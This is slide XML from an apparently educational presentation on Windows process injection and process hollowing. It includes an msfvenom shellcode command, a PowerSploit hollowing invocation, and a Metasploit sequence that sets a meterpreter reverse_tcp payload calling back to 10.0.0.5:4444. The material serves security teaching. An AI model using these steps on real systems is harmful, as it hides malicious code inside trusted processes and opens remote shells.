              <a:t> with </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>PROCESS_ALL_ACCESS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> may fail on protected system processes (e.g., modern Windows protects </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>csrss.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>lsass.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>For </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>C++</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>, compile with Visual Studio or MinGW — ensure the architecture (x86/x64) matches the target process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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>For </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>C#</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>, compile with </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>csc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>dotnet build</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>. The target process must be running and accessible with the current user's privileges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rgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Shellcode generation</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> (for C# example): </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> -p windows/x64/exec CMD=calc.exe -f </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>csharp</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31426581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0" y="94397"/>
            <a:ext cx="11201205" cy="6669206"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Part 2 Practice Process Hollowing: Start a legitimate process in a suspended state, replace its memory with your shellcode, and resume it. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAf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What is Process Hollowing?</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0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAf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In plain English:</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" b="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" kern="100" dirty="0">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>You create a trusted process (like notepad.exe) but you pause it immediately before it runs any code. Then, you "hollow out" its original code memory and replace it with your malicious shellcode. Finally, you "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" kern="100" dirty="0" err="1">
                <a:effectLst/>
                <a:latin typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Aptos" panose="020B0004020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>unpause</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 it. The operating system thinks it's running Notepad, but it's actually running your shellcode – all under the trusted cover of a legitimate Windows binary.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US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Option A</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 No Coding – Use an Existing Tool</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If you want to demonstrate Process Hollowing without writing a single line of code, use one of these:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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PowerShell (Invoke-CreateProcessHollowing.ps1)</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 Part of </a:t>
            </a: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PowerSploit</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Import-Module .\Invoke-CreateProcessHollowing.ps1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>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Invoke-</a:t>
            </a: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CreateProcessHollowing</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ProcessName</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notepad.exe -Shellcode (Get-Content .\</a:t>
            </a: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payload.bin</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-Raw)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="7380421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1" y="109182"/>
            <a:ext cx="12645419" cy="6748818"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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Metasploit</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 Use the windows/</a:t>
            </a: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process_hollowing</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module:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pP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msf</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use exploit/windows/local/</a:t>
            </a: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process_hollowing</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set PAYLOAD windows/x64/</a:t>
            </a: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meterpreter</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a:t>
            </a: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reverse_tcp</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set LHOST 10.0.0.5</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>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set LPORT 4444</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>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run</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" marR="0" lvl="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1000"/>
              <a:buNone/>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Cobalt Strike</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 Use the inject command combined with spawn to hollow a new process.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>Option B: Go with C++</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Process Hollowing code:-  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/WEEK-09-Task-4-Part-2-Process-Hollowing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>If you want it through </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>  to save it</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>You will have to add echo --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> here goes your code line 1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>echo --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:sym typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              </a:rPr>
              <a:t> here goes your code line 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Explanation :- </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>https://github.com/umarniazafrid/WEEK-09-Task-4-Part-2-Process-Hollowing/blob/main/Process%20Hollowing%20code%20Explanation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40084759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0DF44B-A827-4B9D-0C7C-87DB0F5C2B3B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="210402" y="90100"/>
            <a:ext cx="11981597" cy="6767900"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:no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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MinGW (g++)</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="Menl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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>g++ hollow.cpp -o hollow.exe -m64 -</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>lntdll</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MSVC (cl.exe)</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="F9FAFB"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>cl /</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0" err="1">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>EHsc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> hollow.cpp</a:t>
            </a:r>
            <a:endParaRPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:solidFill>
                <a:srgbClr val="800080"/>
              </a:solidFill>
              <a:effectLst/>
              <a:latin typeface="quote-cjk-patch"/>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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>However, there is one critical difference:</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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MinGW (g++)</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>: Works in </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>any normal CMD</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> (as long as MinGW is installed and added to your system </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>PATH</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>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F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>MSVC (cl.exe)</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>: Requires the </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t>"Developer Command Prompt"</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> (a special CMD that comes with Visual Studio). If you open a normal CMD, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>cl</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:srgbClr val="F9FAFB"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="quote-cjk-patch"/>
              </a:rPr>
              <a:t> will not be recognized.</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000" b="0" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0" dirty="0">
                <a:ln>
                  <a:noFill/>
                </a:ln>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
            </a:b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indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
